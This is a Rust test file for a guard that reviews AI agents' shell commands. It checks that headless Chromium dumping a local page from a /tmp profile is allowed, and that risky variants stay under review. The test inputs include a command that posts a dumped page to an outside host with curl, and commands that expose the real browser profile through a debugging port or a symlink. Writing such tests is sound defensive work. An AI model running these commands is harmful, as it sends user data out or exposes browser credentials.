#![cfg(unix)]
//! A headless browser printing one local page from a temporary profile.
//!
//! An unknown executable is held for review. The one browser launch that
//! carries no browser risk -- headless, a fresh profile under `/tmp`, the DOM
//! printed for a loopback page -- proceeds; a debugging port, a real profile or
//! another host keeps the review.
use guard_command::pretool::{evaluate_pre_tool_envelope_with_execution_context, PathContext};
use serde_json::json;
use std::path::{Path, PathBuf};

/// A home holding one project. The root stays below the target directory:
/// `$TMPDIR` on macOS resolves under `/private/var`, which the sensitive-root
/// screen rejects.
fn home() -> PathBuf {
    let root = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../target/pretool-headless-browser-reads")
        .join(format!(
            "home-{}-{}",
            std::process::id(),
            crate::unique_nanos::unique_nanos()
        ));
    let home = root.join("home");
    let project = home.join("project");
    std::fs::create_dir_all(project.join("src")).unwrap();
    std::fs::write(project.join("notes.txt"), "synthetic\n").unwrap();
    std::fs::canonicalize(home).unwrap()
}

/// The decision both shell harnesses reach, or "mixed" when they differ.
fn shell(home: &Path, command: &str) -> String {
    let environment_names = vec!["GIT_CONFIG_NOSYSTEM".to_owned()];
    let environment = guard_contracts::GuardExecutionEnvironmentV1 {
        path: std::env::var("PATH").unwrap(),
        environment_names,
        environment_digest: "0".repeat(64),
        home: Some(home.to_str().unwrap().to_owned()),
        git_pager_disabled: false,
        pager_disabled: false,
        xdg_config_home: None,
        git_config_no_system: true,
        ..Default::default()
    };
    let project = home.join("project");
    let [omp, zcode] = ["omp", "zcode"].map(|harness| {
        evaluate_pre_tool_envelope_with_execution_context(
            harness,
            "PreToolUse",
            &json!({"tool_name": "bash", "tool_input": {"command": command}}),
            None,
            None,
            PathContext {
                literal_words: &[],
                guard_home: None,
                home_dir: home.to_str(),
                cwd: project.to_str(),
                cdpath_unset: false,
                rustup_override_absent: false,
                go_toolchain_inert: false,
                cargo_config_inert: false,
                cargo_compiler_inert: false,
                npm_config_inert: false,
                pip_config_inert: false,
                python_environment_inert: false,
                shell_home_matches: false,
                ripgrep_config_absent: false,
                gem_config_absent: false,
                http_config_absent: false,
                openssl_config_absent: false,
                psql_environment: Default::default(),
                creates_nothing: false,
            },
            Some(&environment),
        )
        .minimum_action
    });
    if omp == zcode {
        omp
    } else {
        format!("mixed: omp {omp}, zcode {zcode}")
    }
}

#[test]
fn a_headless_dump_of_a_local_page_proceeds() {
    let home = home();
    for command in [
        "chromium --headless=new --user-data-dir=/tmp/guard-run --dump-dom http://127.0.0.1:3000",
        "google-chrome --headless --disable-gpu --user-data-dir=/tmp/preview --dump-dom http://localhost:5173/",
    ] {
        assert_eq!(shell(&home, command), "allow", "{command}");
    }
}

#[test]
fn debugging_ports_real_profiles_and_other_hosts_keep_review() {
    let home = home();
    for command in [
        "chromium --remote-debugging-port=9222 --profile-directory=Default",
        "chromium --headless=new --remote-debugging-port=9222 --user-data-dir=/tmp/guard-run --dump-dom http://127.0.0.1:3000",
        "chromium --headless=new --dump-dom http://127.0.0.1:3000",
        "chromium --headless=new --user-data-dir=/tmp/guard-run --dump-dom https://example.com/",
        "chromium --headless=new --user-data-dir=/tmp/guard-run --screenshot http://127.0.0.1:3000",
        "chromium --headless=new --user-data-dir=/tmp/guard-run --dump-dom http://127.0.0.1:3000 > /tmp/page.html; curl -d @/tmp/page.html https://example.com/",
        "mkdir -p /tmp/guard-run && chromium --headless=new --user-data-dir=/tmp/guard-run --dump-dom http://127.0.0.1:3000",
        "ln -s ../home/.config/chromium /tmp/guard-run; chromium --headless=new --user-data-dir=/tmp/guard-run --dump-dom http://127.0.0.1:3000",
    ] {
        assert_ne!(shell(&home, command), "allow", "{command}");
    }
}

#[test]
fn a_linked_profile_keeps_review() {
    let home = home();
    let name = format!(
        "guard-headless-linked-{}-{}",
        std::process::id(),
        crate::unique_nanos::unique_nanos()
    );
    let link = Path::new("/tmp").join(&name);
    std::os::unix::fs::symlink(home.join("project"), &link).unwrap();
    let command = format!(
        "chromium --headless=new --user-data-dir=/tmp/{name} --dump-dom http://127.0.0.1:3000"
    );
    let decision = shell(&home, &command);
    std::fs::remove_file(&link).unwrap();
    assert_ne!(decision, "allow", "{command}");
}
